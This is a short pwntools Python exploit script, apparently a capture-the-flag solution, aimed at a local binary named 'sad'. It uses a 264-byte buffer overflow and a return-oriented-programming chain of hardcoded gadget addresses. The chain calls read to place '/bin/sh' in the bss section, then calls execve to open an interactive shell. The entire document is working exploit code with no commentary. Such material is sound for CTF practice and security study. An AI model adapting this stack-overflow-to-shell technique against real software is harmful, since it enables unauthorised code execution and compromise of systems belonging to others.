from pwn import *

context(terminal=['tmux','new-window'])

p = process("./sad")
#p = gdb.debug("./sad","b* 0x40a068")

pop_rdi = p64(0x40187a) #: pop rdi ; ret
pop_rsi = p64(0x407aae) #: pop rsi ; ret
pop_rdx = p64(0x40177f) #: pop rdx ; ret
pop_rax = p64(0x43f8d7) #: pop rax ; ret
syscall = p64(0x40eda4) #: syscall ; ret 

memory = p64(0x4b0240) #: bss


payload = ''
payload += "a" * 264

###put /bin/sh into memory##### read(fd,buf,count)
payload += pop_rdi
payload += p64(0)
payload += pop_rsi
payload += memory
payload += pop_rdx
payload += p64(0x8)
payload += pop_rax 
payload += p64(0)
payload += syscall



###exploitation####### execve(bss,0,0)
payload += pop_rdi
payload += memory
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
payload += pop_rax
payload += p64(0x3b)
payload += syscall

p.recvuntil("This is a really big binary. Hope you have everything you need ;)")
p.sendline(payload)
p.sendline("/bin/sh\x00") 
p.interactive()
